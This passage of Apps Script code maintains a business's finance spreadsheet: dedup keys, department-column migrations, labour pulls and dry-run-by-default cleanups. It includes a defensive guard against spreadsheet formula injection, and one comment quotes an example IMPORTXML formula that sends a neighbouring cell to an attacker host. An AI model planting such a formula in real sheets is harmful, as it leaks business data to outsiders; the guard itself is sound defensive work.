  return { rowsAdded: toAppend.length, rowsUpdated: rowsUpdated, duplicatesSkipped: duplicatesSkipped, updates: updates };
}

/* ------------------------------------------------------------------ *
 * Spreadsheet formula injection (CWE-1236)
 * ------------------------------------------------------------------ */

// Google Sheets evaluates a cell whose text begins with one of these as a
// FORMULA. '@' is Excel-only but is included because these tabs get exported.
var SHEET_FORMULA_TRIGGERS_ = ['=', '+', '-', '@'];
var SHEET_TEXT_GUARD_ = "'";

/**
 * Force a value to be stored as literal text when it would otherwise be read
 * as a formula. Strings only — Numbers and Dates are returned untouched, so
 * every money/date column is unaffected.
 *
 * Why this exists: normalizeSupplierRow/normalizeRevenueRow only String()-
 * coerce, and appendRow writes the result verbatim. Supplier names scraped
 * from portals, invoice_refs OCR'd out of PDFs, and the Order app's shopId ->
 * `customer` all reach cells this way, so an upstream value of
 * `=IMPORTXML("https://attacker/"&A1,"//x")` becomes a live formula that runs
 * the moment Jake opens the Sheet — exfiltrating the row next to it.
 *
 * A leading apostrophe is the Sheets-native "treat as text" marker. It is a
 * formatting marker, not part of the value, so it must never be allowed to
 * change a dedup key — rowKey_ strips it before comparing (see below), which
 * makes this safe whether or not Sheets echoes the apostrophe back on read.
 *
 * Idempotent: an already-guarded value is returned unchanged, so applying
 * this twice (e.g. ingest, then an _archive copy-back) never doubles up.
 */
function sheetSafeCell_(v) {
  if (typeof v !== 'string' || v.length === 0) return v;
  if (v.charAt(0) === SHEET_TEXT_GUARD_) return v; // already guarded
  if (SHEET_FORMULA_TRIGGERS_.indexOf(v.charAt(0)) === -1) return v;
  return SHEET_TEXT_GUARD_ + v;
}

/** Map sheetSafeCell_ over one row. Returns a new array; never mutates. */
function sheetSafeRow_(row) {
  if (!row || typeof row.length !== 'number') return row;
  var out = [];
  for (var i = 0; i < row.length; i++) out.push(sheetSafeCell_(row[i]));
  return out;
}

/** Map sheetSafeRow_ over a block of rows. Returns a new array. */
function sheetSafeBlock_(rows) {
  var out = [];
  for (var i = 0; i < rows.length; i++) out.push(sheetSafeRow_(rows[i]));
  return out;
}

/** Strip the text-guard apostrophe so a guarded value keys identically to
 *  its unguarded twin. Load-bearing: without it, guarding invoice_ref would
 *  orphan every existing row and re-add the money under a new key. */
function sheetUnguardCell_(v) {
  return (typeof v === 'string' && v.charAt(0) === SHEET_TEXT_GUARD_) ? v.slice(1) : v;
}

/**
 * The ONE way to normalize a value into a dedup/lookup key part.
 *
 * Use this ANYWHERE a key is built, not just in rowKey_. Several call sites
 * key a value read back from the sheet (which carries the text guard) against
 * the same value freshly pulled from an API (which does not) — greenBeanPull
 * and wholesalePull both build such snapshots. A key builder that skips the
 * unguard step silently fails to match for any ref beginning with = + - or @,
 * which breaks the date-move self-heal and makes the orphan detector accuse a
 * live invoice of being stale (whose runbook tells a human to zero the row).
 */
function sheetKeyPart_(v) {
  return String(sheetUnguardCell_(v)).trim().toLowerCase();
}

function rowKey_(rowArray, keyCols) {
  var parts = [];
  for (var i = 0; i < keyCols.length; i++) {
    var v = rowArray[keyCols[i]];
    v = (v instanceof Date) ? coerceDateStr_(v) : v;
    parts.push(sheetKeyPart_(v));
  }
  return parts.join('||');
}

function appendNewRows_(sheet, rows) {
  for (var i = 0; i < rows.length; i++) sheet.appendRow(sheetSafeRow_(rows[i]));
}

/* ------------------------------------------------------------------ *
 * One-time / idempotent setup
 * ------------------------------------------------------------------ */

/**
 * setupSheets — materialize the two-tab schema in the hub Sheet.
 * Idempotent: ensureSheet only creates + formats tabs that are missing, so
 * running this repeatedly is safe and never touches existing data.
 * Run once from the Apps Script editor (or `clasp run setupSheets`) to seed
 * headers; doPost/connectors also call ensureSheet lazily on first write.
 *   Suppliers : date | supplier | total | invoice_ref | location | source | extracted_at | department
 *   Sales     : date | location | gross_sales | source | extracted_at | department
 *   Revenue   : date | department | channel | customer | amount | order_ref | source | extracted_at
 *   _staging  : same columns as Suppliers (scratch area, see docs/schema.md)
 * @returns {string} human-readable summary of which tabs exist
 */
function setupSheets() {
  var ss = getHubSpreadsheet_();
  ensureSheet(ss, SUPPLIERS_TAB, SUPPLIERS_HEADERS);
  ensureSheet(ss, SALES_TAB, SALES_HEADERS);
  ensureSheet(ss, STAGING_TAB, SUPPLIERS_HEADERS);
  ensureSheet(ss, LABOUR_TAB, LABOUR_HEADERS);
  var summary = 'Tabs ready: ' + SUPPLIERS_TAB + ', ' + SALES_TAB + ', ' + STAGING_TAB + ', ' + LABOUR_TAB;
  Logger.log(summary);
  return summary;
}

/* ------------------------------------------------------------------ *
 * Labour-cost pull (reads Onboarding app LABOUR_COST sheet)
 * ------------------------------------------------------------------ */

/**
 * Get the Onboarding app spreadsheet that owns LABOUR_COST.
 * Requires script property LABOUR_SHEET_ID (DEV: 1SUg3rE5V46HQ7JtZzqus960KdLjxJd6AdcrYDq8zyGs).
 * Returns null (never throws) so callers can guard cleanly.
 */
function getLabourSpreadsheet_() {
  var id = PropertiesService.getScriptProperties().getProperty('LABOUR_SHEET_ID');
  if (!id) { Logger.log('labourWeeklyPull_: LABOUR_SHEET_ID not set — skipping'); return null; }
  try { return SpreadsheetApp.openById(id); }
  catch (e) { Logger.log('labourWeeklyPull_: cannot open LABOUR_SHEET_ID — ' + e.message); return null; }
}

/**
 * Pull labour cost for the given week(s) from the Onboarding app LABOUR_COST sheet.
 * Writes to the Labour tab (dedup week_start||location) AND to Summary (supplier='Labour').
 * Safe to call with empty/missing source — logs and returns zeros without writing garbage.
 *
 * @param {Array<{start:string,end:string}>} weeks  ISO date strings (week.start, week.end).
 *   A single week is passed as a one-element array. The external LABOUR_COST
 *   source is read exactly once for the whole list, not once per week.
 * @param {Spreadsheet}              ss     Hub spreadsheet
 * @param {Sheet}                    summSheet  Already-open Summary sheet
 * @param {string}                   pulledAt   ISO timestamp string
 * @returns {{labourAdded:number, summaryAdded:number, summaryUpdated:number}}
 */
function labourWeeklyPull_(weeks, ss, summSheet, pulledAt) {
  var labourSheet = ensureSheet(ss, LABOUR_TAB, LABOUR_HEADERS);

  var srcSS = getLabourSpreadsheet_();
  if (!srcSS) return { labourAdded: 0, summaryAdded: 0, summaryUpdated: 0 };

  var srcSheet = srcSS.getSheetByName('LABOUR_COST');
  if (!srcSheet) {
    Logger.log('labourWeeklyPull_: LABOUR_COST tab not found in source — skipping');
    return { labourAdded: 0, summaryAdded: 0, summaryUpdated: 0 };
  }

  var srcData = srcSheet.getDataRange().getValues();
  if (srcData.length <= 1) {
    Logger.log('labourWeeklyPull_: LABOUR_COST is empty — skipping');
    return { labourAdded: 0, summaryAdded: 0, summaryUpdated: 0 };
  }

  // Map source headers → column indexes
  var hdr = srcData[0];
  var col = {};
  for (var h = 0; h < hdr.length; h++) col[String(hdr[h])] = h;

  var weekStartSet = {};
  for (var w = 0; w < weeks.length; w++) weekStartSet[weeks[w].start] = true;

  // Labour tab dedup set. week_start reads back from a Sheet as a Date —
  // coerceDateStr_ before comparing or the key never matches its 'yyyy-MM-dd'
  // counterpart and the dedup silently passes everything through.
  var labourKeys = {};
  var labourData = labourSheet.getDataRange().getValues();
  for (var r = 1; r < labourData.length; r++) {
    labourKeys[coerceDateStr_(labourData[r][0]) + '||' + String(labourData[r][2])] = true;
  }

  var labourAdded = 0;
  var summaryNormalizedRows = [];

  for (var i = 1; i < srcData.length; i++) {
    var row = srcData[i];
    var ws = coerceDateStr_(row[col['week_start']]);
    if (!weekStartSet[ws]) continue;

    var location = String(row[col['location']] || '');
    var total    = Math.round(Number(row[col['total']] || 0) * 100) / 100;
    var isoWeek  = String(row[col['iso_week']] || '');
    var we       = coerceDateStr_(row[col['week_end']]);

    // Write to Labour tab. Labour is parked (no behaviour change), but it
    // still gets DEFAULT_DEPARTMENT so it isn't silently dropped by a
    // department-filtered read.
    var lKey = ws + '||' + location;
    if (!labourKeys[lKey]) {
      labourSheet.appendRow(sheetSafeRow_([ws, we, location, total, isoWeek, pulledAt, DEFAULT_DEPARTMENT]));
      labourKeys[lKey] = true;
      labourAdded++;
    }

    // Queue the Summary row, routed through the SAME upsertRows_ key
    // weeklySummarize uses (week_start||department||kind||supplier||location)
    // — two different dedup schemes writing the same tab is exactly the bug
    // §1e exists to prevent.
    summaryNormalizedRows.push([ws, we, 'Labour', location, total, pulledAt, DEFAULT_DEPARTMENT, 'spend']);
  }

  var summaryResult = upsertRows_(summSheet, summaryNormalizedRows, SUMMARY_KEY_COLS, SUMMARY_TOTAL_COL, SUMMARY_STAMP_COL);

  Logger.log('labourWeeklyPull_: weeks=' + weeks.map(function (w) { return w.start; }).join(',') +
    ' labourAdded=' + labourAdded +
    ' summaryAdded=' + summaryResult.rowsAdded + ' summaryUpdated=' + summaryResult.rowsUpdated);
  return { labourAdded: labourAdded, summaryAdded: summaryResult.rowsAdded, summaryUpdated: summaryResult.rowsUpdated };
}

/* ------------------------------------------------------------------ *
 * Sheet + output helpers
 * ------------------------------------------------------------------ */

/**
 * Get the hub spreadsheet — by HUB_SHEET_ID script property if set, else the
 * bound active spreadsheet.
 */
function getHubSpreadsheet_() {
  var id = PropertiesService.getScriptProperties().getProperty('HUB_SHEET_ID');
  if (id) return SpreadsheetApp.openById(id);
  var active = SpreadsheetApp.getActiveSpreadsheet();
  if (active) return active;
  throw new Error('No hub spreadsheet: set HUB_SHEET_ID script property or bind the project to a Sheet.');
}

/**
 * Ensure a tab exists with the given headers; create + format if missing.
 * Lifted from LEIBLE_Oder_app/Engine_Utils.js (sage header, frozen row 1).
 */
function ensureSheet(ss, sheetName, headers) {
  var sheet = ss.getSheetByName(sheetName);
  if (!sheet) {
    sheet = ss.insertSheet(sheetName);
    if (headers && headers.length) {
      sheet.appendRow(headers);
      sheet.getRange(1, 1, 1, headers.length)
        .setBackground('#a5b89d').setFontColor('#ffffff').setFontWeight('bold');
      sheet.setFrozenRows(1);
    }
  }
  return sheet;
}

/* ------------------------------------------------------------------ *
 * Migration — add the `department` column (idempotent, dry-run by default)
 * ------------------------------------------------------------------ */

// SUPPLIERS_HEADERS-shaped tabs, incl. _staging and _archive.
var DEPARTMENT_TABS = [
  [SUPPLIERS_TAB, SUPPLIERS_HEADERS], [STAGING_TAB, SUPPLIERS_HEADERS],
  [ARCHIVE_TAB, SUPPLIERS_HEADERS], [SALES_TAB, SALES_HEADERS],
  [LABOUR_TAB, LABOUR_HEADERS]
];

/**
 * Add the `department` header + backfill blank data cells to every tab in
 * DEPARTMENT_TABS, plus rewrite the Summary header row and create Revenue.
 * DRY RUN BY DEFAULT — matches this repo's convention for destructive Sheet
 * work (cleanupCorruptSalesRows, cleanupDuplicateSummaryRows).
 *   migrateAddDepartment_()       → dry run, reports only
 *   migrateAddDepartment_(false)  → writes
 * Idempotency is checked PER TAB, so a run that dies halfway resumes cleanly.
 * @returns {Object} { <tabName>: {tab, headerAction, blanksFilled}, ... }
 */
function migrateAddDepartment_(dryRun) {
  dryRun = (dryRun !== false);
  return withScriptLock_(function () {
    var ss = getHubSpreadsheet_(), report = {};
    DEPARTMENT_TABS.forEach(function (p) {
      report[p[0]] = addDepartmentColumn_(ss.getSheetByName(p[0]), p[1], dryRun, p[0]);
    });
    report[SUMMARY_TAB] = migrateSummaryHeaders_(ss.getSheetByName(SUMMARY_TAB), dryRun, SUMMARY_TAB);
    if (!dryRun) ensureSheet(ss, REVENUE_TAB, REVENUE_HEADERS);
    return report;
  });
}

/**
 * Sweep pass, separate from the header migration on purpose:
 * addDepartmentColumn_ short-circuits the moment the header exists, so
 * calling it a second time can never fill anything — it would report
 * 'skipped', look successful, and leave blank-department rows written during
 * the runbook's deploy window (step 3-6) there permanently and invisibly.
 * fillBlankDepartments_ has NO header guard, so it always sweeps.
 *   sweepBlankDepartments_()       → dry run, reports only
 *   sweepBlankDepartments_(false)  → writes
 */
function sweepBlankDepartments_(dryRun) {
  dryRun = (dryRun !== false);
  return withScriptLock_(function () {
    var ss = getHubSpreadsheet_(), report = {};
    DEPARTMENT_TABS.forEach(function (p) {
      report[p[0]] = fillBlankDepartments_(ss.getSheetByName(p[0]), p[1], dryRun, p[0]);
    });
    return report;
  });
}

/* ------------------------------------------------------------------ *
 * Editor entry points for the migration runbook.
 *
 * migrateAddDepartment_ / sweepBlankDepartments_ are private (trailing _),
 * so they never appear in the Apps Script Run dropdown — and the Run button
 * passes NO arguments, so even a public version could only ever be invoked
 * as dryRun===undefined, which the `dryRun !== false` default turns into a
 * dry run. The write path is unreachable from the editor without a no-arg
 * wrapper: it would report success and change nothing.
 *
 * These also Logger.log the report, because the editor displays log output
 * but NOT return values — the report is a return value.
 * ------------------------------------------------------------------ */

function runDepartmentMigrationDryRun() {
  var report = migrateAddDepartment_();
  Logger.log('DRY RUN (nothing written): ' + JSON.stringify(report, null, 2));
  return report;
}

function runDepartmentMigrationApply() {
  var report = migrateAddDepartment_(false);
  Logger.log('APPLIED (written): ' + JSON.stringify(report, null, 2));
  return report;
}

function runBlankDepartmentSweepDryRun() {
  var report = sweepBlankDepartments_();
  Logger.log('SWEEP DRY RUN (nothing written): ' + JSON.stringify(report, null, 2));
  return report;
}

function runBlankDepartmentSweepApply() {
  var report = sweepBlankDepartments_(false);
  Logger.log('SWEEP APPLIED (written): ' + JSON.stringify(report, null, 2));
  return report;
}

/**
 * Owns the HEADER only. Guarded on header presence — a second call is a
 * safe no-op that reports 'already migrated'. Delegates the data fill to
 * fillBlankDepartments_.
 * @returns {{tab:string, headerAction:('add'|'present'|'absent'), blanksFilled:number}}
 */
function addDepartmentColumn_(sheet, headers, dryRun, tabName) {
  if (!sheet) return { tab: tabName || null, headerAction: 'absent', blanksFilled: 0 };

  var headerRow = sheet.getDataRange().getValues()[0] || [];
  var deptCol = headers.indexOf('department') + 1; // 1-based

  if (headerRow.indexOf('department') !== -1) {
    return { tab: tabName, headerAction: 'present', blanksFilled: 0 };
  }

  if (!dryRun) sheet.getRange(1, deptCol).setValue('department');

  var fill = fillBlankDepartments_(sheet, headers, dryRun, tabName);
  return { tab: tabName, headerAction: 'add', blanksFilled: fill.blanksFilled };
}

/**
 * Owns the DATA. Always scans, always blank-only-fills — never clobbers an
 * existing value — regardless of header state. Idempotent by construction (a
 * filled cell is not blank).
 *
 * Single setValues block write, not a per-row setValue loop — _archive holds
 * up to ARCHIVE_RETENTION_DAYS of rows and a per-row loop risks the 6-minute
 * GAS execution limit, dying mid-tab.
 * @returns {{tab:string, headerAction:('present'|'absent'), blanksFilled:number}}
 */
function fillBlankDepartments_(sheet, headers, dryRun, tabName) {
  if (!sheet) return { tab: tabName || null, headerAction: 'absent', blanksFilled: 0 };

  var deptCol = headers.indexOf('department'); // 0-based
  var values = sheet.getDataRange().getValues();

  var blanksFilled = 0;
  var writes = []; // { row: 1-based sheet row, value }
  for (var r = 1; r < values.length; r++) {
    var cur = values[r][deptCol];
    if (cur === undefined || cur === null || String(cur) === '') {
      writes.push(r + 1);
      blanksFilled++;
    }
  }

  if (!dryRun && writes.length) {
    var block = writes.map(function () { return [DEFAULT_DEPARTMENT]; });
    // Contiguous ranges write in one call; non-contiguous rows still need one
    // setValues() per contiguous run to stay a "single block write" per run
    // rather than a per-row loop. Rows are 1-based and ascending here.
    var start = 0;
    for (var i = 1; i <= writes.length; i++) {
      var breakHere = (i === writes.length) || (writes[i] !== writes[i - 1] + 1);
      if (breakHere) {
        var runRows = writes.slice(start, i);
        sheet.getRange(runRows[0], deptCol + 1, runRows.length, 1)
          .setValues(sheetSafeBlock_(block.slice(start, i)));
        start = i;
      }
    }
  }

  return { tab: tabName, headerAction: 'present', blanksFilled: blanksFilled };
}

/**
 * The Summary tab is NOT rebuilt by weeklySummarize (append-with-upsert,
 * never a header rewrite), so its header row must be rewritten in place:
 * rename E1 'total_spend' -> 'total', write G1 'department' / H1 'kind', and
 * backfill existing data rows 'Cafe' / 'spend'. Idempotent on the presence
 * of 'kind' in the header row.
 * @returns {{tab:string, headerAction:('add'|'present'|'absent'), blanksFilled:number}}
 */
function migrateSummaryHeaders_(sheet, dryRun, tabName) {
  if (!sheet) return { tab: tabName || null, headerAction: 'absent', blanksFilled: 0 };

  var values = sheet.getDataRange().getValues();
  var headerRow = values[0] || [];

  if (headerRow.indexOf('kind') !== -1) {
    return { tab: tabName, headerAction: 'present', blanksFilled: 0 };
  }

  if (!dryRun) {
    sheet.getRange(1, 1, 1, SUMMARY_HEADERS.length).setValues([SUMMARY_HEADERS]);
  }

  // Backfill data rows: department (col 7) / kind (col 8) blank-only.
  var blanksFilled = 0;
  var deptWrites = [], kindWrites = [];
  for (var r = 1; r < values.length; r++) {
    var dept = values[r][6];
    var kind = values[r][7];
    if (dept === undefined || dept === null || String(dept) === '') { deptWrites.push(r + 1); blanksFilled++; }
    if (kind === undefined || kind === null || String(kind) === '') { kindWrites.push(r + 1); }
  }

  if (!dryRun) {
    deptWrites.forEach(function (rowNum) { sheet.getRange(rowNum, 7).setValue(DEFAULT_DEPARTMENT); });
    kindWrites.forEach(function (rowNum) { sheet.getRange(rowNum, 8).setValue('spend'); });
  }

  return { tab: tabName, headerAction: 'add', blanksFilled: blanksFilled };
}


/**
 * One-shot fix for the 2026-06-22 Fresh & Chill North mis-seed: the North session
 * was accidentally a different shop's account, so rows tagged location='Leible North'
 * are actually another shop's orders. Delete them all; a fresh connector run then
 * repopulates correct North orders (and un-blocks the other shop's real rows).
 * Run once from the Apps Script editor, then delete this function.
 */
function cleanupFreshNorthRows() {
  var ss = getHubSpreadsheet_();
  var sheet = ss.getSheetByName(SUPPLIERS_TAB);
  if (!sheet) { Logger.log('No Suppliers tab'); return; }

  var data = sheet.getDataRange().getValues();
  var locationCol = 4; // E
  var sourceCol = 5;   // F

  var deleted = 0;
  for (var r = data.length - 1; r >= 1; r--) { // bottom-up to avoid row-shift
    if (String(data[r][sourceCol]).toLowerCase() !== 'fresh_and_chill') continue;
    if (String(data[r][locationCol]) !== 'Leible North') continue;
    sheet.deleteRow(r + 1);
    deleted++;
  }

  var msg = 'Fresh North cleanup done: deleted=' + deleted;
  Logger.log(msg);
  return msg;
}

var CLEANUP_EXPECTED_CORRUPT_ROWS = 8;   // module-level so tests can reassign it

/**
 * True if a Sales row is a trigger-event corruption (Fault 3): the date column
 * holds a stringified trigger event object instead of a date.
 *
 * The date cell reads back as a Date for healthy rows and a String for corrupt
 * ones, so normalize via coerceDateStr_ first. Narrowed to source='square' — a
 * predicate that DELETES shouldn't assume nothing else ever writes Sales.
 * Blank rows have source '' → never touched.
 *
 * gross_sales === 0 is deliberately NOT part of this: it's true of all 8 known
 * corrupt rows, but it's a symptom, not the definition — a genuinely closed
 * trading day is $0 on a valid date and must be kept. The date shape is the
 * invariant.
 */
function salesRowIsCorrupt_(row) {
  if (String(row[3]).trim().toLowerCase() !== 'square') return false;
  return !DATE_ARG_RE.test(coerceDateStr_(row[0]));
}

/**
 * ONE-SHOT (destructive): delete the Sales rows corrupted by the Fault 3 trigger.
 *
 * DRY RUN BY DEFAULT — only an explicit `false` deletes. The editor's Run button
 * passes no argument, and a trigger would pass an event object; both are
 * non-false → both dry-run. (That's Fault 3's own bug turned into a safety
 * property.)
 *
 *   cleanupCorruptSalesRows()       → dry run, logs what it WOULD delete
 *   cleanupCorruptSalesRows(false)  → actually deletes
 *
 * THE DRY RUN IS MANDATORY, NOT ADVISORY. salesRowIsCorrupt_ matches ANY
 * source='square' row whose date isn't YYYY-MM-DD — a blank date, or a date
 * stored as text ('15/07/2026'), would match too. The CLEANUP_EXPECTED_CORRUPT_ROWS
 * guard is the only thing bounding that, so read the pass-1 log and confirm all
 * 8 rows are genuinely the trigger-event corruption BEFORE passing false.
 *
 * Delete this function, salesRowIsCorrupt_ and CLEANUP_EXPECTED_CORRUPT_ROWS once
 * it has been run — but KEEP DATE_ARG_RE and resolveDateArg_, which are
 * load-bearing for the Fault 3 fix in squareDailyPull.
 */
function cleanupCorruptSalesRows(dryRun) {
  var isDryRun = (dryRun !== false);
  var ss = getHubSpreadsheet_();
  var sheet = ss.getSheetByName(SALES_TAB);
  if (!sheet) { Logger.log('cleanupCorruptSalesRows: no Sales tab'); return 'no-sheet'; }

  var data = sheet.getDataRange().getValues();

  // Pass 1: identify + log every match, in BOTH modes, so the destructive run
  // leaves the same audit trail as the dry run.
  var matches = [];
  for (var r = 1; r < data.length; r++) {
    if (!salesRowIsCorrupt_(data[r])) continue;
    matches.push(r);
    Logger.log('cleanupCorruptSalesRows: row ' + (r + 1) +
      ' | location=' + String(data[r][1]) +
      ' | gross=' + String(data[r][2]) +
      ' | date=' + String(data[r][0]).slice(0, 60));
  }

  Logger.log('cleanupCorruptSalesRows: ' + (isDryRun ? 'DRY RUN' : 'APPLY') +
    ' — found ' + matches.length + ' corrupt row(s)');

  if (isDryRun) {
    return { mode: 'dryRun', found: matches.length, rows: matches.map(function (r) { return r + 1; }) };
  }

  if (matches.length !== CLEANUP_EXPECTED_CORRUPT_ROWS) {
    Logger.log('ABORT: expected ' + CLEANUP_EXPECTED_CORRUPT_ROWS + ', got ' + matches.length);
    return 'aborted';
  }

  // Pass 2: delete bottom-up so pass-1 row numbers stay valid as rows shift.
  var deleted = 0;
  for (var m = matches.length - 1; m >= 0; m--) {
    sheet.deleteRow(matches[m] + 1);
    deleted++;
  }

  Logger.log('cleanupCorruptSalesRows: deleted=' + deleted);
  return { mode: 'apply', found: matches.length, deleted: deleted };
}

/**
 * cleanupDuplicateSummaryRows — one-shot repair for the Summary rows appended by
 * the broken week_start dedup (it keyed on String(Date), which never matched the
 * 'yyyy-MM-dd' key, so every weeklySummarize run re-appended the whole week).
 *
 * Keeps the FIRST row for each week_start||department||kind||supplier||location
 * and removes the later copies (the same key upsertRows_ uses for Summary —
 * once Summary carries department+kind, a Cafe-spend row and a
 * Roastery-revenue row sharing week_start+supplier+location must NOT be
 * treated as the same conflict). doGet sums Summary, so leaving duplicates in
 * over-reports by however many times the week was summarized.
 *
 * A later row is only ever deleted when its total MATCHES the row it duplicates.
 * A same-key row with a different total is not a mechanical duplicate — it means
 * the underlying spend changed between runs — so it is reported as a conflict and
 * left alone rather than silently destroying the newer figure.
 *
 * Dry run by default, matching cleanupCorruptSalesRows: pass false to apply.
 * Idempotent — a second apply finds nothing.
 *
 * @param {boolean} dryRun  false to actually delete; anything else = dry run
 * @returns {Object} { mode, found, deleted, conflicts:[] }
 */
function cleanupDuplicateSummaryRows(dryRun) {
  var isDryRun = (dryRun !== false);
  var ss = getHubSpreadsheet_();
  var sheet = ss.getSheetByName(SUMMARY_TAB);
  if (!sheet) { Logger.log('cleanupDuplicateSummaryRows: no Summary tab'); return 'no-sheet'; }

  var data = sheet.getDataRange().getValues();

  // Pass 1: identify, in both modes, so an apply leaves the same audit trail.
  var firstSeen = {};          // key -> { row, total }
  var matches = [];
  var conflicts = [];

  for (var r = 1; r < data.length; r++) {
    var key = rowKey_(data[r], SUMMARY_KEY_COLS);
    var total = Number(data[r][4]);

    if (!firstSeen[key]) {
      firstSeen[key] = { row: r, total: total };
      continue;
    }

    var kept = firstSeen[key];
    if (total !== kept.total) {
      conflicts.push({ row: r + 1, key: key, keptTotal: kept.total, thisTotal: total });
      Logger.log('cleanupDuplicateSummaryRows: CONFLICT row ' + (r + 1) + ' | ' + key +
        ' | kept row ' + (kept.row + 1) + ' total=' + kept.total + ' vs this total=' + total +
        ' — NOT deleted, resolve by hand');
      continue;
    }

    matches.push(r);
    Logger.log('cleanupDuplicateSummaryRows: dup row ' + (r + 1) + ' | ' + key +
      ' | total=' + total + ' | duplicates row ' + (kept.row + 1));
  }

  Logger.log('cleanupDuplicateSummaryRows: ' + (isDryRun ? 'DRY RUN' : 'APPLY') +
    ' — ' + matches.length + ' duplicate(s), ' + conflicts.length + ' conflict(s)');

  if (isDryRun) {
    return {
      mode: 'dryRun', found: matches.length, deleted: 0, conflicts: conflicts,
      rows: matches.map(function (r) { return r + 1; })
    };
  }

  // Pass 2: delete bottom-up so pass-1 row numbers stay valid as rows shift.
  var deleted = 0;
  for (var m = matches.length - 1; m >= 0; m--) {
    sheet.deleteRow(matches[m] + 1);
    deleted++;
  }

  Logger.log('cleanupDuplicateSummaryRows: deleted=' + deleted);
  return { mode: 'apply', found: matches.length, deleted: deleted, conflicts: conflicts };
}

/* ------------------------------------------------------------------ *
 * v23 online-revenue grain cleanup (one-shot, dry-run by default)
 * ------------------------------------------------------------------ */

var ONLINE_REVENUE_BACKUP_TAB = 'Summary_online_revenue_backup';

/**
 * Index the LIVE Revenue tab's online rows by ISO week.
 *
 * Two questions the cleanup cannot answer from Summary alone:
 *   1. Can week W actually be rebuilt? weeklySummarize re-derives Summary from
 *      Revenue, so a week whose Revenue rows are gone comes back as nothing —
 *      deleting its Summary row would destroy the figure with no source to
 *      regenerate it from. `rows` answers that.
 *   2. Is the week safe to rebuild? aggregateSupplierRows_ groups on the RAW
 *      channel string while rowKey_ lowercases (Code.gs:421), so 'Online' and
 *      'online' in one week produce two groups that collapse to one Summary
 *      row — the later one dropped as an in-batch duplicate. `casings` surfaces
 *      that before it silently eats revenue on the re-summarize.
 *
 * @returns {Object} weekStart -> { rows, casings:[] }
 */
function onlineRevenueWeeks_(ss) {
  var out = {};
  var revSheet = ss.getSheetByName(REVENUE_TAB);
  if (!revSheet) return out;

  var rows = revSheet.getDataRange().getValues();
  for (var r = 1; r < rows.length; r++) {
    var channel = String(rows[r][2]).trim();
    if (channel.toLowerCase() !== 'online') continue;

    var date = coerceDateStr_(rows[r][0]);
    if (!DATE_ARG_RE.test(date)) continue;

    var wk = weekStartForDate_(date);
    if (!out[wk]) out[wk] = { rows: 0, casings: [] };
    out[wk].rows++;
    if (out[wk].casings.indexOf(channel) === -1) out[wk].casings.push(channel);
  }
  return out;
}

/**
 * cleanupOnlineRevenueSummaryRows — one-shot repair for the online-revenue
 * grain change that shipped in version 23 (aggregateSupplierRows_, 2026-08-03):
 * online revenue is now grouped by SOURCE, where it used to be grouped by
 * CUSTOMER.
 *
 * SUMMARY_KEY_COLS includes `supplier`, so the new source-keyed rows do not
 * update the old customer-keyed ones — upsertRows_ sees a new key and APPENDS
 * alongside them. doGet sums Summary, so every affected week is then counted
 * twice. The stale rows have to be deleted and those weeks re-summarized.
 *
 * SCOPE — matches kind='revenue' AND location='online', both case-insensitive,
 * and nothing else. Wholesale revenue deliberately keeps per-customer grain, so
 * its key is unchanged and its rows are already correct; spend and labour rows
 * are never touched.
 *
 * The apply pass COPIES every matched row to ONLINE_REVENUE_BACKUP_TAB before
 * deleting it. That backup is the whole safety net for a week flagged
 * `resummarizable:false` — re-summarizing such a week regenerates nothing, so
 * the backup row is the only remaining record of the figure.
 *
 * Dry run by default, matching cleanupCorruptSalesRows /
 * cleanupDuplicateSummaryRows: pass false to apply. Idempotent — a second apply
 * finds nothing.
 *
 * @param {boolean} dryRun  false to actually delete; anything else = dry run
 * @returns {Object} { mode, found, deleted, weeks:[{week_start, rows, total, resummarizable, ...}] }
 */
function cleanupOnlineRevenueSummaryRows(dryRun) {
  var isDryRun = (dryRun !== false);
  return withScriptLock_(function () {
    var ss = getHubSpreadsheet_();
    var sheet = ss.getSheetByName(SUMMARY_TAB);
    if (!sheet) { Logger.log('cleanupOnlineRevenueSummaryRows: no Summary tab'); return 'no-sheet'; }

    var data = sheet.getDataRange().getValues();
    var revWeeks = onlineRevenueWeeks_(ss);
    var today = todayStr_();

    // Pass 1: identify + log every match in BOTH modes, so an apply leaves the
    // same audit trail as the dry run that authorized it.
    var matches = [];
    var weeks = {};

    for (var r = 1; r < data.length; r++) {
      var kind = String(data[r][7]).trim().toLowerCase();
      var location = String(data[r][3]).trim().toLowerCase();
      if (kind !== 'revenue' || location !== 'online') continue;

      // shopify_orderapp Summary rows are written directly by the orderapp pull
      // (PRD-10), not derived from Revenue — this cleanup's subject is the v23
      // customer-keyed grain-change rows, and deleting a pull-owned row would be
      // unrecoverable by resummarize (no Revenue rows back it).
      if (String(data[r][2]).trim().toLowerCase() === 'shopify_orderapp') {
        Logger.log('cleanupOnlineRevenueSummaryRows: skipping pull-owned shopify_orderapp row ' + (r + 1));
        continue;
      }

      var weekStart = coerceDateStr_(data[r][0]);
      matches.push(r);

      if (!weeks[weekStart]) {
        var weekEnd = addDaysStr_(weekStart, 6);
        weeks[weekStart] = {
          week_start: weekStart,
          week_end: weekEnd,
          rows: 0,
          total: 0,
          // weeklySummarize REFUSES a week that has not finished, so deleting
          // an in-flight week's rows would be unrecoverable except by hand from
          // the backup tab.
          complete: weekEnd < today,
          revenueRowsPresent: revWeeks[weekStart] ? revWeeks[weekStart].rows : 0,
          channelCasings: revWeeks[weekStart] ? revWeeks[weekStart].casings : []
        };
      }
      weeks[weekStart].rows++;
      weeks[weekStart].total += Number(data[r][4]) || 0;

      Logger.log('cleanupOnlineRevenueSummaryRows: match row ' + (r + 1) +
        ' | week=' + weekStart +
        ' | supplier=' + String(data[r][2]) +
        ' | department=' + String(data[r][6]) +
        ' | total=' + String(data[r][4]));
    }

    var weekList = Object.keys(weeks).sort().map(function (w) {
      var wk = weeks[w];
      wk.total = Math.round(wk.total * 100) / 100;
      wk.resummarizable = wk.complete && wk.revenueRowsPresent > 0;

      if (!wk.resummarizable) {
        Logger.log('cleanupOnlineRevenueSummaryRows: WARNING week ' + w +
          ' is NOT re-summarizable (' +
          (wk.complete ? 'no online rows left in ' + REVENUE_TAB : 'week has not finished yet') +
          ') — restore its figure from ' + ONLINE_REVENUE_BACKUP_TAB + ' by hand.');
      }
      if (wk.channelCasings.length > 1) {
        Logger.log('cleanupOnlineRevenueSummaryRows: WARNING week ' + w +
          ' has mixed channel casing ' + JSON.stringify(wk.channelCasings) +
          ' — rowKey_ lowercases, so one group collapses into the other and the week' +
          ' under-reports. Normalize the casing in ' + REVENUE_TAB + ' BEFORE re-summarizing.');
      }
